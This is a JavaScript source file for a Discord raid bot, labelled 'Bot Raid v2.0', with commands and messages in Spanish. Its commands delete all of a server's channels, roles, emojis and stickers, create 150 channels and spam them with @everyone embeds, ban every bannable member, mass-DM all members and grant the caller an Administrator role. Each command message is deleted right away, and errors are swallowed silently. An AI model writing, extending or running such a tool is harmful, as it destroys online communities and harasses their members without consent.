require('dotenv').config();
const keepAlive = require('./keep_alive.js');
keepAlive();

const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  AttachmentBuilder,
  ChannelType,
  PermissionFlagsBits
} = require('discord.js');
const fs = require('fs');
const path = require('path');

// ==================== CONFIGURACIÓN ====================
const CONFIG = {
  DISCORD_TOKEN: process.env.DISCORD_TOKEN,
  ASSETS_DIR: './attached_assets',
  ICON_FILE: '40fd13ae2d1126651d55d5411b28b65f_1768104286084.png',
  TRIANGULITO_FILE: 'images.webp',
  BATCH_SIZE: 10,
  SPAM_COUNT: 20,
  MAX_CHANNELS: 150,
  CONCURRENCY: 5
};

// ==================== UTILIDADES ====================

class BotUtils {
  static loadBuffer(filename) {
    try {
      const filepath = path.join(CONFIG.ASSETS_DIR, filename);
      if (!fs.existsSync(filepath)) {
        console.warn(`⚠️ Archivo no encontrado: ${filepath}`);
        return null;
      }
      return fs.readFileSync(filepath);
    } catch (err) {
      console.error(`❌ Error cargando ${filename}:`, err.message);
      return null;
    }
  }

  static async batchExecute(items, concurrency, fn) {
    const results = [];
    for (let i = 0; i < items.length; i += concurrency) {
      const batch = items.slice(i, i + concurrency);
      const batchResults = await Promise.allSettled(batch.map(fn));
      results.push(...batchResults.filter(r => r.status === 'fulfilled').map(r => r.value));
    }
    return results;
  }

  static async deleteAllChannels(guild) {
    try {
      const channels = await guild.channels.fetch();
      await this.batchExecute(
        [...channels.values()],
        CONFIG.CONCURRENCY,
        c => c.delete().catch(() => {})
      );
      console.log(`✅ Canales eliminados: ${channels.size}`);
    } catch (err) {
      console.error('❌ Error eliminando canales:', err.message);
    }
  }

  static async createChannels(guild, name, count) {
    try {
      const created = [];
      for (let i = 0; i < count; i += CONFIG.BATCH_SIZE) {
        const size = Math.min(CONFIG.BATCH_SIZE, count - i);
        const batch = await Promise.allSettled(
          Array.from({ length: size }, () =>
            guild.channels.create({ name, type: ChannelType.GuildText })
          )
        );
        batch.forEach(r => {
          if (r.status === 'fulfilled' && r.value) created.push(r.value);
        });
      }
      console.log(`✅ Canales creados: ${created.length}`);
      return created;
    } catch (err) {
      console.error('❌ Error creando canales:', err.message);
      return [];
    }
  }

  static async spamChannels(channels, msgCount, buildMsg) {
    try {
      await this.batchExecute(
        channels,
        CONFIG.CONCURRENCY,
        async (channel) => {
          if (!channel) return;
          for (let i = 0; i < msgCount; i++) {
            try {
              await channel.send(buildMsg());
              await new Promise(resolve => setTimeout(resolve, 100));
            } catch (err) {
              // Silenciar errores individuales
            }
          }
        }
      );
      console.log(`✅ Spam completado en ${channels.length} canales`);
    } catch (err) {
      console.error('❌ Error en spam:', err.message);
    }
  }

  static async deleteAllRoles(guild) {
    try {
      const roles = await guild.roles.fetch();
      const toDelete = roles.filter(r => r.editable && r.name !== '@everyone');
      await this.batchExecute(
        [...toDelete.values()],
        CONFIG.CONCURRENCY,
        r => r.delete().catch(() => {})
      );
      console.log(`✅ Roles eliminados: ${toDelete.size}`);
    } catch (err) {
      console.error('❌ Error eliminando roles:', err.message);
    }
  }

  static async deleteAllEmojis(guild) {
    try {
      const [emojis, stickers] = await Promise.all([
        guild.emojis.fetch(),
        guild.stickers.fetch()
      ]);
      const items = [...emojis.values(), ...stickers.values()];
      await this.batchExecute(
        items,
        CONFIG.CONCURRENCY,
        item => item.delete().catch(() => {})
      );
      console.log(`✅ Emojis/Stickers eliminados: ${items.length}`);
    } catch (err) {
      console.error('❌ Error eliminando emojis:', err.message);
    }
  }

  static async dmAllMembers(guild, message) {
    try {
      const members = await guild.members.fetch();
      const humanMembers = members.filter(m => !m.user.bot);
      await this.batchExecute(
        [...humanMembers.values()],
        CONFIG.CONCURRENCY,
        m => m.send(message).catch(() => {})
      );
      console.log(`✅ DMs enviados: ${humanMembers.size}`);
    } catch (err) {
      console.error('❌ Error enviando DMs:', err.message);
    }
  }

  static async banAllMembers(guild, client) {
    try {
      const members = await guild.members.fetch({ force: true });
      const bannable = members.filter(m => m.bannable && m.id !== client.user.id);
      await this.batchExecute(
        [...bannable.values()],
        CONFIG.CONCURRENCY,
        m => m.ban({ deleteMessageSeconds: 604800, reason: 'BAN COMMAND' }).catch(() => {})
      );
      console.log(`✅ Miembros baneados: ${bannable.size}`);
    } catch (err) {
      console.error('❌ Error baneando miembros:', err.message);
    }
  }

  static async renameAllChannels(guild, name) {
    try {
      const channels = await guild.channels.fetch();
      await this.batchExecute(
        [...channels.values()],
        CONFIG.CONCURRENCY,
        c => c.setName(name).catch(() => {})
      );
      console.log(`✅ Canales renombrados: ${channels.size}`);
    } catch (err) {
      console.error('❌ Error renombrando canales:', err.message);
    }
  }
}

// ==================== EMBEDS PREDEFINIDOS ====================

const EMBEDS = {
  invasion: () => new EmbedBuilder()
    .setColor(0xFF0000)
    .setDescription('⚠️ PARCE QUE TUNG TUNG SAHUR ESTA DOMINANDO EL SERVER\n**¡TODOS SALGANSE AHORAA!**'),

  triangulito: () => new EmbedBuilder()
    .setColor(0xFF0000)
    .setTitle('👑 TRIANGULITO ES EL MEJOR')
    .setDescription('**¡HABEIS SIDO RAIDEADO POR EL GOAT DE TRIANGULITO!**')
    .setImage('attachment://triangulito.webp'),

  help: () => new EmbedBuilder()
    .setColor(0xFF0000)
    .setTitle('📋 MENÚ DE AYUDA')
    .setDescription('**Comandos disponibles:**')
    .addFields(
      { name: '`.diversión`', value: 'Borra canales, crea 150 nuevos, spamea y cambia el server', inline: false },
      { name: '`.bypass <mensaje>`', value: 'Renombra todos los canales y spamea un mensaje', inline: false },
      { name: '`.delroles`', value: 'Elimina todos los roles del servidor', inline: false },
      { name: '`.delemojis`', value: 'Elimina todos los emojis y stickers', inline: false },
      { name: '`.limpiar`', value: 'Borra todos los canales', inline: false },
      { name: '`.ban`', value: 'Banea a todos los miembros baneables', inline: false },
      { name: '`.md <mensaje>`', value: 'Envía un DM a todos los miembros', inline: false },
      { name: '`.admin`', value: 'Te da rol de administrador', inline: false },
      { name: '`.triangulo`', value: 'Crea canales TRIANGULITO ES EL MEJOR y spamea', inline: false }
    )
    .setFooter({ text: 'Bot Raid v2.0 - Mejorado' }),

  secretHelp: () => new EmbedBuilder()
    .setColor(0xFF00FF)
    .setTitle('🔐 MENÚ SECRETO')
    .setDescription('**`.ayudasecreta`** - Comando exclusivo\n\n¡Recupera todos los roles eliminados y canales borrados!')
};

// ==================== COMANDOS ====================

const COMMANDS = {
  async diversión(message, guild, client) {
    await BotUtils.deleteAllChannels(guild);
    const channels = await BotUtils.createChannels(guild, 'TRIANGULITO THE GOAT', CONFIG.MAX_CHANNELS);
    await BotUtils.spamChannels(channels, CONFIG.SPAM_COUNT, () => ({
      content: '@everyone',
      embeds: [EMBEDS.invasion()]
    }));
    await Promise.all([
      guild.setName('TRIANGULITO GOAT').catch(() => {}),
      BUFFERS.icon ? guild.setIcon(BUFFERS.icon).catch(() => {}) : null
    ]);
  },

  async bypass(message, guild, args) {
    const text = args.join(' ') || 'bypass';
    const channels = await guild.channels.fetch();
    await BotUtils.batchExecute(
      [...channels.values()],
      CONFIG.CONCURRENCY,
      async (channel) => {
        await channel.setName(text).catch(() => {});
        await channel.send({ content: text }).catch(() => {});
      }
    );
  },

  async delroles(message, guild) {
    await BotUtils.deleteAllRoles(guild);
  },

  async delemojis(message, guild) {
    await BotUtils.deleteAllEmojis(guild);
  },

  async limpiar(message, guild) {
    await BotUtils.deleteAllChannels(guild);
  },

  async ban(message, guild, client) {
    await BotUtils.banAllMembers(guild, client);
  },

  async md(message, guild, args) {
    const text = args.join(' ');
    if (!text) return message.channel.send('❌ Debes proporcionar un mensaje').catch(() => {});
    await BotUtils.dmAllMembers(guild, text);
  },

  async admin(message, guild, member) {
    try {
      const role = await guild.roles.create({
        name: 'Papuamigo god',
        permissions: [PermissionFlagsBits.Administrator]
      });
      await member.roles.add(role);
      console.log(`✅ Rol de admin dado a ${member.user.tag}`);
    } catch (err) {
      console.error('❌ Error creando rol admin:', err.message);
    }
  },

  async triangulo(message, guild, client) {
    await BotUtils.deleteAllChannels(guild);
    const channels = await BotUtils.createChannels(guild, 'TRIANGULITO ES EL MEJOR', CONFIG.MAX_CHANNELS);
    if (BUFFERS.triangulito) {
      await BotUtils.spamChannels(channels, 10, () => ({
        content: '@everyone',
        embeds: [EMBEDS.triangulito()],
        files: [new AttachmentBuilder(BUFFERS.triangulito, { name: 'triangulito.webp' })]
      }));
    }
  },

  async ayuda(message) {
    await message.channel.send({ embeds: [EMBEDS.help()] }).catch(() => {});
  },

  async ayudasecreta(message) {
    await message.channel.send({ embeds: [EMBEDS.secretHelp()] }).catch(() => {});
  },

  async nodiversion(message, guild) {
    try {
      const categories = [
        {
          name: '📢 INFORMACIÓN',
          channels: [
            { name: 'bienvenidas', type: ChannelType.GuildText },
            { name: 'reglas', type: ChannelType.GuildText },
            { name: 'anuncios', type: ChannelType.GuildText }
          ]
        },
        {
          name: '💬 GENERAL',
          channels: [
            { name: 'chat-general', type: ChannelType.GuildText },
            { name: 'fotos', type: ChannelType.GuildText },
            { name: 'comandos', type: ChannelType.GuildText }
          ]
        },
        {
          name: '🎤 VOCAL',
          channels: [
            { name: 'General', type: ChannelType.GuildVoice },
            { name: 'Música', type: ChannelType.GuildVoice },
            { name: 'Gaming', type: ChannelType.GuildVoice }
          ]
        }
      ];

      const roles = [
        { name: 'Admin', color: 'Red', permissions: [PermissionFlagsBits.Administrator] },
        { name: 'Moderador', color: 'Green', permissions: [PermissionFlagsBits.ManageMessages, PermissionFlagsBits.KickMembers] },
        { name: 'Usuario Verificado', color: 'Blue', permissions: [] }
      ];

      // Crear categorías y canales
      for (const catData of categories) {
        try {
          const category = await guild.channels.create({
            name: catData.name,
            type: ChannelType.GuildCategory
          });
          for (const ch of catData.channels) {
            await guild.channels.create({
              name: ch.name,
              type: ch.type,
              parent: category.id
            }).catch(() => {});
          }
        } catch (err) {
          console.error(`Error creando categoría ${catData.name}:`, err.message);
        }
      }

      // Crear roles
      for (const r of roles) {
        await guild.roles.create({
          name: r.name,
          color: r.color,
          permissions: r.permissions
        }).catch(() => {});
      }

      console.log('✅ Servidor restaurado correctamente');
    } catch (err) {
      console.error('❌ Error en .nodiversion:', err.message);
    }
  }
};

// ==================== CARGAR BUFFERS ====================

const BUFFERS = {
  icon: BotUtils.loadBuffer(CONFIG.ICON_FILE),
  triangulito: BotUtils.loadBuffer(CONFIG.TRIANGULITO_FILE)
};

// ==================== CLIENTE DISCORD ====================

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent
  ]
});

// ==================== EVENTOS ====================

client.on('ready', () => {
  console.log(`\n✅ Bot conectado como: ${client.user.tag}`);
  const perms = 1342385206n;
  console.log(`📎 Link de invitación:`);
  console.log(`https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=${perms}&scope=bot\n`);
});

client.on('messageCreate', async message => {
  try {
    if (!message.content.startsWith('.') || message.author.bot) return;

    // Borrar comando inmediatamente
    message.delete().catch(() => {});

    const { guild, member } = message;
    const parts = message.content.slice(1).split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const args = parts.slice(1);

    if (!guild) {
      return message.channel.send('❌ Este comando solo funciona en servidores').catch(() => {});
    }

    if (COMMANDS[cmd]) {
      console.log(`🔧 Ejecutando comando: .${cmd}`);
      await COMMANDS[cmd](message, guild, args, client, member);
    } else {
      console.log(`⚠️ Comando desconocido: .${cmd}`);
    }
  } catch (err) {
    console.error('❌ Error procesando comando:', err.message);
  }
});

// ==================== LOGIN ====================

if (!CONFIG.DISCORD_TOKEN) {
  console.error('❌ ERROR: DISCORD_TOKEN no está configurado en .env');
  process.exit(1);
}

client.login(CONFIG.DISCORD_TOKEN).catch(err => {
  console.error('❌ Error al conectar:', err.message);
  process.exit(1);
});

// ==================== MANEJO DE ERRORES ====================

process.on('unhandledRejection', err => {
  console.error('❌ Promise rechazada sin manejar:', err);
});

process.on('uncaughtException', err => {
  console.error('❌ Excepción no capturada:', err);
  process.exit(1);
});
